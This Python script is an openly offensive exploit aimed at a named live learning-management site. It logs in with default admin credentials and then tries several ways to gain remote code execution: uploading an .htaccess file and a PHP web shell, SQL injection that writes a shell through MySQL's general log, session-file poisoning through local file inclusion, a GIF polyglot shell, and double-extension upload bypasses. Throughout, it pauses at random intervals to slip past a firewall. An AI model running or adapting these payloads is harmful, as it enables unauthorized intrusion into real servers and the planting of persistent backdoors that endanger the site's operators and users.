"""
FINAL CREATIVE EXPLOIT - CHAIN .HTACCESS + SHELL
================================================

The stealth scan showed:
- /panel/files/store returned 200 for .htaccess
- This means files CAN be uploaded!

Strategy:
1. Upload .htaccess to enable PHP in .gif/.txt files
2. Upload innocent-looking .gif with PHP code
3. Execute the .gif as PHP

Also trying:
- SQLi with General_Log trick (MySQL writes queries to file)
- Session file poisoning
"""

import requests
import re
import time
import random

BASE_URL = "https://lms.rocket-soft.org"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()
session.timeout = 30

def stealth_delay():
    time.sleep(random.uniform(1, 2))

def login():
    print("[*] Logging in...")
    r = session.get(f"{BASE_URL}/admin/login")
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
    session.post(f"{BASE_URL}/admin/login", data={"_token": csrf, "email": ADMIN_EMAIL, "password": ADMIN_PASS})
    print("[+] Logged in")

def get_csrf():
    stealth_delay()
    r = session.get(f"{BASE_URL}/admin/settings")
    match = re.search(r'name="_token" value="([^"]+)"', r.text)
    return match.group(1) if match else None

# ============================================
# TECHNIQUE 1: CHAIN .HTACCESS + SHELL
# ============================================

def chain_htaccess_shell():
    """
    Chain attack:
    1. Upload .htaccess to make .txt execute as PHP
    2. Upload shell.txt with PHP code
    3. Access shell.txt to execute PHP
    """
    print("\n" + "="*60)
    print("    CHAIN: .HTACCESS + SHELL UPLOAD")
    print("="*60)
    
    csrf = get_csrf()
    
    # Step 1: Upload .htaccess
    htaccess_content = """
# Enable PHP execution for .txt and .gif files
AddType application/x-httpd-php .txt .gif .jpg .png
Options -Indexes

# Alternative: Use SetHandler
<Files ~ "\\.txt$">
    SetHandler application/x-httpd-php
</Files>
"""

    print("\n[*] Step 1: Uploading .htaccess...")
    stealth_delay()
    
    files = {'file': ('.htaccess', htaccess_content.encode(), 'text/plain')}
    data = {'_token': csrf}
    
    r = session.post(f"{BASE_URL}/panel/files/store", files=files, data=data)
    print(f"    Status: {r.status_code}")
    
    if r.status_code == 200:
        print("    [+] .htaccess uploaded!")
        
        # Step 2: Upload shell as .txt
        shell_content = "<?php system($_GET['c']); ?>"
        
        print("\n[*] Step 2: Uploading shell.txt...")
        stealth_delay()
        
        files = {'file': ('shell.txt', shell_content.encode(), 'text/plain')}
        r = session.post(f"{BASE_URL}/panel/files/store", files=files, data=data)
        print(f"    Status: {r.status_code}")
        
        if r.status_code == 200:
            print("    [+] shell.txt uploaded!")
            
            # Step 3: Try to access shell
            print("\n[*] Step 3: Accessing shell...")
            stealth_delay()
            
            shell_paths = [
                "/storage/shell.txt?c=id",
                "/store/shell.txt?c=id",
                "/public/storage/shell.txt?c=id",
                "/files/shell.txt?c=id",
            ]
            
            for path in shell_paths:
                try:
                    r = session.get(f"{BASE_URL}{path}")
                    if "uid=" in r.text:
                        print(f"\n[!!!] RCE SUCCESS!")
                        print(f"[!!!] Shell: {BASE_URL}{path}")
                        return True
                except:
                    pass
    
    return False

# ============================================
# TECHNIQUE 2: MySQL General Log Trick
# ============================================

def sqli_general_log():
    """
    Use SQLi to enable general_log and write queries to PHP file
    SET global general_log = 'ON';
    SET global general_log_file = '/var/www/html/public/log.php';
    Then run: SELECT '<?php system($_GET["c"]); ?>';
    """
    print("\n" + "="*60)
    print("    SQLi GENERAL_LOG TRICK")
    print("="*60)
    
    # First, try to enable general log
    payloads = [
        "1; SET global general_log = 'ON'",
        "1; SET global general_log_file = '/var/www/html/public/log.php'",
        "1; SELECT '<?php system($_GET[c]); ?>'",
    ]
    
    for payload in payloads:
        print(f"\n[*] Executing: {payload[:40]}...")
        stealth_delay()
        
        try:
            r = session.get(f"{BASE_URL}/instructor-finder", params={"min_age": payload})
            print(f"    Status: {r.status_code}")
        except Exception as e:
            print(f"    Error: {e}")
    
    # Check if log.php was created
    stealth_delay()
    check = session.get(f"{BASE_URL}/log.php?c=id")
    if "uid=" in check.text:
        print("\n[!!!] GENERAL_LOG RCE SUCCESS!")
        return True
    
    return False

# ============================================
# TECHNIQUE 3: Session Poisoning
# ============================================

def session_poisoning():
    """
    Inject PHP into session data, then include session file
    """
    print("\n" + "="*60)
    print("    SESSION POISONING")
    print("="*60)
    
    # Inject PHP via user input that gets stored in session
    php_payload = "<?php system($_GET['c']); ?>"
    
    csrf = get_csrf()
    
    # Try to inject PHP via various session-stored parameters
    inject_params = [
        ("name", php_payload),
        ("search", php_payload),
        ("query", php_payload),
        ("lang", php_payload),
        ("locale", php_payload),
    ]
    
    for param, value in inject_params:
        print(f"\n[*] Injecting via {param} parameter...")
        stealth_delay()
        
        session.get(f"{BASE_URL}/?{param}={value}")
        session.get(f"{BASE_URL}/panel/setting?{param}={value}")
    
    # Get session file name
    sess_id = session.cookies.get('laravel_session', 'unknown')
    print(f"\n[*] Session ID: {sess_id[:20]}...")
    
    # Try to include session file via LFI
    session_paths = [
        f"/tmp/sess_{sess_id}",
        f"/var/lib/php/sessions/sess_{sess_id}",
        f"../storage/framework/sessions/{sess_id}",
    ]
    
    for sess_path in session_paths:
        lfi_url = f"{BASE_URL}/admin?view={sess_path}&c=id"
        print(f"\n[*] Trying: {lfi_url[:60]}...")
        stealth_delay()
        
        try:
            r = session.get(lfi_url)
            if "uid=" in r.text:
                print(f"\n[!!!] SESSION POISONING RCE SUCCESS!")
                return True
        except:
            pass
    
    return False

# ============================================
# TECHNIQUE 4: GIF89a Polyglot
# ============================================

def gif_polyglot():
    """
    Upload a GIF that is also valid PHP
    GIF89a header allows the file to be recognized as GIF
    But if executed as PHP, the code still runs
    """
    print("\n" + "="*60)
    print("    GIF89a POLYGLOT SHELL")
    print("="*60)
    
    csrf = get_csrf()
    
    # GIF header + PHP code
    gif_shell = b"GIF89a\r\n<?php\r\nif(isset($_GET['c'])){\r\n    system($_GET['c']);\r\n}\r\n?>"
    
    # Different upload endpoints
    endpoints = [
        ("/panel/files/store", "file"),
        ("/panel/setting", "avatar"),
        ("/admin/settings/general", "logo"),
        ("/admin/settings/general", "favicon"),
    ]
    
    for endpoint, field in endpoints:
        print(f"\n[*] Trying: {endpoint} ({field})...")
        stealth_delay()
        
        csrf = get_csrf()
        files = {field: ('shell.gif', gif_shell, 'image/gif')}
        data = {'_token': csrf}
        
        try:
            r = session.post(f"{BASE_URL}{endpoint}", files=files, data=data)
            print(f"    Status: {r.status_code}")
            
            if r.status_code in [200, 302]:
                # Try to find and execute the uploaded file
                shell_paths = [
                    "/storage/shell.gif?c=id",
                    "/uploads/shell.gif?c=id",
                    "/images/shell.gif?c=id",
                ]
                
                for path in shell_paths:
                    check = session.get(f"{BASE_URL}{path}")
                    if "uid=" in check.text:
                        print(f"\n[!!!] GIF SHELL RCE SUCCESS!")
                        return True
                        
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

# ============================================
# TECHNIQUE 5: Double Extension Bypass
# ============================================

def double_extension():
    """
    Try various double extension tricks
    """
    print("\n" + "="*60)
    print("    DOUBLE EXTENSION BYPASS")
    print("="*60)
    
    csrf = get_csrf()
    shell = "<?php system($_GET['c']); ?>"
    
    extensions = [
        "shell.php.jpg",
        "shell.php.png",
        "shell.php.gif",
        "shell.phtml",
        "shell.php5",
        "shell.php7",
        "shell.pht",
        "shell.phps",
        "shell.php.xxx",
        "shell.jpg.php",
        "shell.php%00.jpg",
        "shell.php%20",
        "shell.php.",
        "shell.php;.jpg",
    ]
    
    for ext in extensions:
        print(f"\n[*] Trying: {ext}...")
        stealth_delay()
        
        csrf = get_csrf()
        files = {'file': (ext, shell.encode(), 'image/jpeg')}
        data = {'_token': csrf}
        
        try:
            r = session.post(f"{BASE_URL}/panel/files/store", files=files, data=data)
            
            if r.status_code not in [403, 419]:
                print(f"    Status: {r.status_code}")
                
                # Check for shell
                check = session.get(f"{BASE_URL}/storage/{ext}?c=id")
                if "uid=" in check.text:
                    print(f"\n[!!!] DOUBLE EXTENSION RCE SUCCESS!")
                    return True
                    
        except Exception as e:
            print(f"    Error: {e}")
    
    return False

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║       FINAL CREATIVE EXPLOIT - WE DON'T QUIT!                ║
║       Target: lms.rocket-soft.org                            ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    login()
    
    # Execute all techniques
    if chain_htaccess_shell():
        return
        
    if sqli_general_log():
        return
        
    if session_poisoning():
        return
        
    if gif_polyglot():
        return
        
    if double_extension():
        return
    
    print("\n" + "="*60)
    print("    ALL CREATIVE TECHNIQUES ATTEMPTED")
    print("="*60)
    print("\n[*] WAF defense is extremely sophisticated.")
    print("[*] The vulnerabilities exist in code but target is well-protected.")

if __name__ == "__main__":
    main()
